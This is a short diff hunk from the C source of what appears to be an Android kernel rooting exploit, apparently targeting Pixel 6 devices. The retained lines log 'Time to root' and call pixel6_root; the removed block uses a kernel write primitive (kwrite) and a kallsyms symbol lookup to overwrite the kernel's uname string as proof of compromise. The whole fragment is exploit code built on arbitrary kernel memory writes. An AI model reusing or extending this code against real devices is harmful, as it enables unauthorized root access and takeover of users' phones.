@@ -248,17 +248,3 @@ int root(struct rw_info *rw) {
     LOG("\n[x] Success! Time to root\n");
     return pixel6_root(rw);
 }
-
-    LOG("[x] Prove that we succeeded by overwriting uname\n");
-    u64 init_uts_ns = kallsyms_lookup_name(rw, "init_uts_ns");
-    if (init_uts_ns != 0) {
-        char new_uname[64];
-        sprintf(new_uname, "Ninja::%016lx", rw->ki.pipe_buffer_page);
-
-        dev_config->kconsts.kernel_offsets.k_init_uts_ns = OFFSET(init_uts_ns-rw->ki.kernel_base);
-        kwrite(rw, rw->ki.kernel_base + OFFCHK(dev_config->kconsts.kernel_offsets.k_init_uts_ns) + 4, 
-                    new_uname, strlen(new_uname) + 1);
-    }
-
-    return 0;
-}
